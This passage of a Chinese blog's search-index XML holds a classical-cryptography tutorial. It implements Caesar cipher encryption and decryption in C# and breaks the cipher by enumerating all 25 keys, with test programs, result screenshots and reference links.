spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="ciphertext">密文&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;returns>明文&lt;/returns></span>        <span class="token keyword">internal</span> <span class="token keyword">string</span> <span class="token function">CassetteDeCrypt</span><span class="token punctuation">(</span><span class="token keyword">string</span> ciphertext<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">DeCrypt</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>Ceasar类核心解读：</p><p>​        在ceasar中理解的字母表是一个转轮的形式，但在实际的存储中而是以线性方式存储，所有在本代码中通过使用《初等数论》中的<strong>模运算</strong>来得到移位后的字母。（全部以<strong>“A”</strong>为基准）</p><ol><li>得到<strong>给定字母</strong>与“A”的偏移量</li><li>计算<strong>移位后</strong>对“A”的偏移量</li><li><font color="red">在取模之前先加上一个基数，使之前的计算结果全部以转化为正数</font></li><li><strong>取模运算</strong>得到目标字母相对于“A”的偏移量</li><li>得到相对于“A”偏移字母的ASCII码并将其<strong>强制转化为字母</strong></li></ol><p><strong>Program测试类：</strong></p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">namespace</span> DemoCeasar<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">Program</span>    <span class="token punctuation">{</span>        <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span>Title <span class="token operator">=</span> <span class="token string">"欢迎使用Ceasar"</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"请输入您期望的操作：(1:加密,0:解密)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">string</span> str <span class="token operator">=</span> Console<span class="token punctuation">.</span><span class="token function">ReadLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> op<span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">.</span><span class="token function">TryParse</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span><span class="token keyword">out</span> op<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                Ceasar ceasar <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Ceasar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>op <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"请输入明文：(字母串)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">string</span> plaintext <span class="token operator">=</span> Console<span class="token punctuation">.</span><span class="token function">ReadLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"请输入密钥:(整数)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">int</span> key <span class="token operator">=</span> Console<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token string">'0'</span><span class="token punctuation">;</span>                    <span class="token keyword">string</span> ciphertext <span class="token operator">=</span> ceasar<span class="token punctuation">.</span><span class="token function">EnCrypt</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>                    Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"{0}加密之后的密文为:{1}"</span><span class="token punctuation">,</span>plaintext<span class="token punctuation">,</span>ciphertext<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>op <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"请输入密文：(字母串)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">string</span> ciphertext <span class="token operator">=</span> Console<span class="token punctuation">.</span><span class="token function">ReadLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"请输入密钥:(整数)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">int</span> key <span class="token operator">=</span> Console<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token string">'0'</span><span class="token punctuation">;</span>                    <span class="token keyword">string</span> plaintext <span class="token operator">=</span> ceasar<span class="token punctuation">.</span><span class="token function">DeCrypt</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>                    Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">else</span>                <span class="token punctuation">{</span>                    Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"输入错误程序终止!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            Console<span class="token punctuation">.</span><span class="token function">ReadKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h1 id="结果显示"><a href="#结果显示" class="headerlink" title="结果显示"></a>结果显示</h1><p><strong>加密操作</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Cryptography/CeasarCipher/EnCrypt.png" alt="EnCrypt"></center><p><strong>解密操作</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Cryptography/CeasarCipher/DeCrypt.png" alt="DeCrypt"></center><h1 id="密码分析"><a href="#密码分析" class="headerlink" title="密码分析"></a>密码分析</h1><p>​        Ceasar密码作为经典的加密算法，在罗马时期有很好的应用。其明文空间M、密文空间C、密钥空间K<del>m</del>相同都为模26的余数集合，也即其加密的密钥有25种情况(<font color="blue">0不计算在内</font>)，通过枚举密钥的方式揣测明文。</p><h2 id="穷举搜索"><a href="#穷举搜索" class="headerlink" title="穷举搜索"></a>穷举搜索</h2><p><strong>CrackSeasar类</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">namespace</span> Crack_Seasar<span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CrackSeasar</span>    <span class="token punctuation">{</span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 枚举检索</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// 枚举搜索</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="ciphertext">密文&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;returns>返回可能的明文字符串组&lt;/returns></span>        <span class="token keyword">internal</span> <span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">EnumerativeSearch</span><span class="token punctuation">(</span><span class="token keyword">string</span> ciphertext<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> plaintext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">string</span><span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">string</span> str <span class="token operator">=</span> ciphertext<span class="token punctuation">.</span><span class="token function">ToUpper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 枚举解密</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> key <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> key <span class="token operator">&lt;</span> <span class="token number">26</span><span class="token punctuation">;</span> key<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token keyword">char</span> ch <span class="token keyword">in</span> str<span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>ch <span class="token operator">>=</span> <span class="token string">'A'</span> <span class="token operator">&amp;&amp;</span> ch <span class="token operator">&lt;=</span> <span class="token string">'Z'</span><span class="token punctuation">)</span>                    <span class="token punctuation">{</span>                        plaintext<span class="token punctuation">[</span>key <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'A'</span> <span class="token operator">+</span> <span class="token punctuation">(</span>ch <span class="token operator">-</span> <span class="token string">'A'</span> <span class="token operator">-</span> key <span class="token operator">+</span> <span class="token number">26</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">else</span>                    <span class="token punctuation">{</span>                        plaintext<span class="token punctuation">[</span>key <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> ch<span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> plaintext<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>Program测试类</strong>：</p><pre class=" language-csahrp"><code class="language-csahrp">using System;namespace Crack_Seasar{    class Program    {        static void Main(string[] args)        {            Console.Title = "CrackSear";            Console.WriteLine("请输入待破解密文：");            string ciphertext = Console.ReadLine();            // 枚举搜索            CrackSeasar crackSeasar = new CrackSeasar();            string[] plaintext = crackSeasar.EnumerativeSearch(ciphertext);            // Display            for(int i = 0;i < 25;i++)            {                Console.WriteLine("key:{0} \t -> \t {1}", i + 1, plaintext[i]);            }            Console.ReadKey();        }    }}</code></pre><p><strong>测试结果</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Cryptography/CeasarCipher/EnumerativeSearch1.png" alt="EnumerativeSearch1"></center><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p><strong>参考链接</strong>：</p><p><a href="https://baike.baidu.com/item/恺撒密码/4905284?fromtitle=%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81&fromid=1336345&fr=aladdin" target="_blank" rel="noopener">凯撒密码-百度百科</a></p><p><a href="https://www.cnblogs.com/ECJTUACM-873284962/p/8639300.html" target="_blank" rel="noopener">凯撒密码加解密即破解实现原理</a></p>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
          <category> 古典密码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ceasar </tag>
            
            <tag> 密码学 </tag>
            
            <tag> 古典密码 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
